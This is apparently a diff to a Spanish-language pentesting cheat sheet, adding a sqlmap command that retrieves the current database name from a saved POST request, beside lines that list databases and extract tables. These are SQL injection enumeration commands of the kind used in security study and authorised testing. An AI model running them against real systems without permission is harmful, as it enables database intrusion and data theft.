@@ -357,6 +357,9 @@ Anthares101@kali:~$ sqlmap --batch --dbs -r post_request.txt
 # Con la opción -r se puede especificar un ejemplo de POST a la página y que sqlmap haga lo suyo
 # La opción --batch hace que no tengamos que interactuar en el proceso (Selecciona todo por defecto)
 
+Anthares101@kali:~$ sqlmap --current-db --batch -r post_request.txt
+# Saca el nombre de la base de datos actual
+
 Anthares101@kali:~$ sqlmap -D DB --tables --batch -r post_request.txt
 # Extrae la tablas de una determinada base de datos
 
